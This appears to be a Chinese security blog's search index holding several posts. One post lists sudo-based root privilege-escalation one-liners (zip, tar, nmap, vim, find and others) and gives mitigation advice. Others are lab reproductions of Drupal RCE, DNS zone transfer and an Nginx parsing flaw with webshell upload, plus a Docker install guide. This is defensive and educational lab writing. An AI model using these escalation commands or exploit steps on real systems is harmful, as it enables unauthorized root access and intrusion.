<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[sudo提权及防范]]></title>
    <url>%2F2019%2F07%2F12%2Fsudo%E6%8F%90%E6%9D%83%E5%8F%8A%E9%98%B2%E8%8C%83%2F</url>
    <content type="text"><![CDATA[sudo提权及防范1、什么是sudo在日常的运维安全工作中，经常会遇到开发 OR 测试 同学要求: 我需要在某某服务器上运行一个东东，必须以root权限运行，请帮忙处理下。怎么办？ 直接给root账户，让其搞去？ 不存在的，但凡是个有章程的公司都不会共享root账户，比较普遍的做法就是利用sudo （Substitute User and Do 的简写）给其临时授权，可以临时让其以root 权限运行某个程序。 但是运维的小伙子们，sudo 授权可要小心，不能求而不拒，什么程序都放行，不然可能会被别有用心的人恶意提权成root账户权限。 下文会详细介绍如何利用特定的sudo 授权程序进行提权。 2、常见的可以利用sudo提升到root权限的命令2.1 ziptomcat用户是个普通用户，申请sudo授权zip命令。首先在tmp目录下创建一个test文件。然后执行：sudo zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c /bin/bash&quot; 成功提权到完整的root权限。-T表示测试test.zip的完整性。–unzip-command 与-T 一起使用，可以指定自定义命令 用于解压test.zip(测试用)利用点就在 可以自定义用于解压test.zip 的的命令，当然自定义解压命令是以root权限执行的，这里指定为sh -c /bin/bash, 就可以以root权限获取一个shell。 2.2 tartomcat是个普通用户，执行命令：sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash 成功提权成完整root权限。简单解释一下，提权是如何实现的： –checkpoint-action 选项是提权点，可以自定义需要执行的动作，当然是以root权限执行。这里指定为exec=/bin/bash，以root权限执行/bin/bash，获取一个root权限的shell 2.3 nmaptomcat为普通用户执行命令：echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; /tmp/shell.nse sudo nmap --script=/tmp/shell.nse 以root权限执行nmap，然后nmap执行脚本，脚本执行/bin/sh，获取root权限shell。如果是老版本的nmap，还可以换一种姿势利用nmap实现root提权。sudo nmap --interactive nmap&gt; !sh sh-4.1# 2.4 stracetomcat为普通用户，执行命令：sudo strace -o/dev/null /bin/bash strace以root权限运行跟踪调试/bin/bash，从而获取root权限的shell。 2.5 moretomcat为普通用户，执行命令：sudo more /etc/rsyslog.conf然后键入!/bin/bash 即可获得root权限的shell。 同理的命令还有less和man （sudo man ssh） 2.6 gittomcat为普通用户，执行命令：sudo git help status 然后键入!/bin/bash，即可以root权限运行/bin/bash，获取root权限的shell，原理同more。 2.7 ftptomcat的为普通用户，执行命令：sudo ftp然后键入!/bin/absh,便可以root权限运行，获取root权限的shell。 2.8 vimtomcat为普通用户，执行命令：sudo vim -c &#39;!sh&#39;可以直接以root权限运行 指定命令，这里可以直接获取root权限的shell. 2.9 findtomcat为普通用户，执行命令：sudo find /bin/ -name ls -exec /bin/bash \; 对于find检索到的每一个结果，都执行/bin/bash，是以root权限执行的哦，很方便的获取root权限的shell。 2.10 passwdtomcat为普通用户，执行命令：sudo passwd sudo passwd 可以更改root密码。然后su root，输入修改后的密码，就可以切换到root shell。 3、如何防范？这才是我关注的重点必须得说，这个不是很好防范，只能尽量减少风险sudo的配置文件只能限制那些用户可以使用sudo，可以使用哪些命令，但不能限制用户使用这些命令进行提权获取root shell，我们设置sudo的本意就是让用户能临时获取root 权限执行某些命令而不是永久获取root shell 并可以root权限执行任何命令，有什么好的办法的？ 我总结了以下几个方法以期能减少sudo 使用带来的风险1） 不要安装某些工具命令比如strace、ftp、nmap、tcpdump、except、nano，这些命令都是可以实现sudo + 命令 提权成root shell的，况且这些命令都不是必须的2） sudo 不能滥授权授权之前，必须仔细审核，能不授权的授权，多考虑替代方案，必要的才授权3）其次使用堡垒机拦截非法命令有人说将用户加入root组，不存在的，加入root组并不能保证用户以root身份执行某些命令。 最好的办法就是前置堡垒机，在堡垒机上进行非法命令拦截，经过我的一番探索，在我司的堡垒机（基于jumpserver 二次开发，研究过jumpserver代码的对下文代码应该会比较熟悉）上实现了拦截非法sudo 提权命令的功能：代码简写如下： data 即为解析后的完整命令，通过正则匹配来检测是否有非法命令（黑名单思路，故有可能被绕过，白名单不知道咋搞） 4、总结如果获取了对于某个命令的sudo 授权，则有可能利用sudo获取root shell，所以在审核申请人sudo 请求的时候，一定要留心。当然还有很多其他命令可以实现0x01 提到的哪些命令所实现的root提权，比如 nano 、wget （通过写密码文件）、tcpdump等]]></content>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS 7源码安装docker]]></title>
    <url>%2F2019%2F07%2F10%2FCentOS%207%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85docker%2F</url>
    <content type="text"><![CDATA[CentOS 7 源码安装 dockerDocker介绍：Docker 是一个开放源代码软件项目，让应用程序布署在软件货柜下的工作可以自动化进行，借此在 Linux 操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。 Docker 利用 Linux 核心中的资源分离机制，例如 cgroups，以及 Linux 核心名字空间，来创建独立的容器。 –维基百科 安装Docker移除旧版本的 Docker yum remove docker \ docker-client \ docker-client-latest \ docker-common \ docker-latest \ docker-latest-logrotate \ docker-logrotate \ docker-selinux \ docker-engine-selinux \ docker-engine 创建 docker 组 groupadd docker 向 docker 组中添加您的用户 usermod -aG docker $USER 安装 Docker 依赖yum install -y yum-utils device-mapper-persistent-data lvm2 添加源yum-config-manager –add-repo https://download.docker.com/linux/centos/docker-ce.repo 更新 yum 缓存yum makecache fast 安装 Docker-CE yum install -y docker-ce 开启 Docker systemctl start docker 安装 Docker Compose curl -L “https://github.com/docker/compose/releases/download/1.22.0/docker-compose-$(uname -s)-$(uname -m)” -o /usr/local/bin/docker-compose chmod +x /usr/local/bin/docker-compose 开机自启动systemctl enable docker 镜像加速器 vim /etc/docker/daemon.json { “registry-mirrors”: [ “https://registry.docker-cn.com“ ] } 重新启动服务 systemctl daemon-reload systemctl restart docker]]></content>
      <tags>
        <tag>安装文档</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）复现]]></title>
    <url>%2F2019%2F07%2F09%2FDrupal%20Drupalgeddon%202%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-7600%EF%BC%89%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）复现 漏洞原理：Drupal 是一款用量庞大的CMS，其6/7/8版本的Form API中存在一处远程代码执行漏洞。详细介绍可参考：https://research.checkpoint.com/uncovering-drupalgeddon-2/。漏洞分析详情可参考： http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/ 存在该漏洞的ip（靶机）：192.168.199.105:8080发起攻击的ip（主机）：192.168.199.195环境搭建好以后，访问http://192.168.199.105:8080/， 可以看到drupal的安装页面，默认配置安装就可以了。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。 漏洞复现：打开burp拦截，拦截到安装好的drupal的流量包，发送到重发器。]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS域传送漏洞 复现]]></title>
    <url>%2F2019%2F07%2F07%2FDNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E%20%20%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[DNS介绍：DNS(Domain Name System，域名管理系统)是万维网WWW的重要基础。它建立在一个分布式数据库基础之上，在这个数据库里，保存了IP地址和域名的相互映射关系。 正因为DNS的存在，我们才不需要记住大量无规则的IP地址， 而只需要知道对方计算机的名称，就可以访问对应服务。比如，笔者的博客是www.lijiejie.com，当用户在浏览器地址栏输入上述域名，浏览器就将向DNS服务器发送查询，得到目标主机的IP地址，再与对应的主机建立一个HTTP连接，请求网页。相对于记住106.187.34.156这个IP地址，域名www.lijiejie.com自然更有意义、更加清晰明了。 DNS服务器使用的TCP/UDP端口号是53。 最常用的DNS记录有以下几类： A记录 IP地址记录,记录一个域名对应的IP地址 AAAA记录 IPv6 地址记录，记录一个域名对应的IPv6地址 CNAME记录 别名记录，记录一个主机的别名 MX记录 电子邮件交换记录，记录一个邮件域名对应的IP地址，比如my[at]lijiejie.com 后面的部分lijiejie.com，邮件服务器对应的IP地址 NS记录 域名服务器记录 ,记录该域名由哪台域名服务器解析 PTR记录 反向记录，也即从IP地址到域名的一条记录 TXT记录 记录域名的相关文本信息 更多详解请参考： http://www.lijiejie.com/dns-zone-transfer-1/ 存在该漏洞的ip（靶机）：192.168.199.151:53 发起攻击的ip（主机）：192.168.199.195 漏洞复现：首先浏览器访问： http://192.168.199.151:53/ 可以看出无法访问该网站。 在Linux下，我们可以使用dig命令来发送dns请求。比如，我们可以用dig @192.168.199.151 www.vulhub.org获取域名www.vulhub.org在目标dns服务器上的A记录：发送axfr类型的dns请求：dig @192.168.199.151 -t axfr vulhub.org： 可见，我获取到了vulhub.org的所有子域名记录，这里存在DNS域传送漏洞。 我们也可以用nmap script来扫描该漏洞：nmap –script dns-zone-transfer.nse –script-args “dns-zone-transfer.domain=vulhub.org“ -Pn -p 53 192.168.199.151。完毕！可以看出该IP确实存在着DNS域传送漏洞。]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx解析漏洞 复现]]></title>
    <url>%2F2019%2F07%2F04%2FNginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[Nginx 解析漏洞复现 版本信息：nginx 1.x最新版PHP 7.x最新版 由此得知，该漏洞与nginx和PHP版本无关，属于用户配置不当造成的解析漏洞。 存在该漏洞的ip（靶机）：192.168.199.173发起攻击的ip（主机）：192.168.199.195环境搭好以后，首先浏览器访问一下 http://192.168.199.173/uploadfiles/nginx.png和 http://192.168.199.173/uploadfiles/nginx.png/.php，正常访问情况如下：可以看出，在结尾添加/.php之后，就被解析成了PHP文件。然后浏览器访问 http://192.168.199.173/index.php，来测试一下上传功能。上传代码是不存在漏洞的，但是可以通过解析漏洞getshell。然后打开burp拦截，随便选一张图片进行上传。然后把拦截到的流量发送到重发器。然后在POST提交的数据最后添加一句话木马。可以看到已经上传成功了。然后试着在浏览器访问一下。可以看到已经上传成功了。然后试着在最后添加/.php全是乱码，说明一句话可能已经被解析了。试着用蚁剑连接一下。OK，可以看到已经成功拿到shell了。]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Drupal远程代码执行漏洞（CVE-2018-7602）复现]]></title>
    <url>%2F2019%2F07%2F01%2FDrupal%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-7602%EF%BC%89%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[Drupal远程代码执行漏洞（CVE-2018-7602）复现 漏洞原理：影响软件：drupal。方式：对URL中的#进行编码两次，绕过sanitize()函数过滤。效果：任意命令执行。漏洞详细分析可参考：http://blog.nsfocus.net/cve-2018-7602-drupal/。 存在该漏洞的ip（靶机）：192.168.199.151:8081发起攻击的ip（主机）：192.168.199.195环境搭好之后，首先浏览器访问： http://192.168.199.151:8081。将会看到drupal的安装界面，直接默认配置安装就可以了，因为没有mysql环境，所以安装的时候可以选择sqlite数据库。 漏洞复现：首先需要整到一个POC，参考网址：https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7602.py。执行如下命令，即可复现该漏洞。 #python3 drupa7-CVE-2018-7602.py -c “id” admin 123456 http://192.168.199.151:8081/。 #admin为用户名；123456为密码；后面ip改为靶机ip；本次实例命令为’id’。如上图所示，看到红框中的内容，得知ID命令已成功执行。]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
</search>
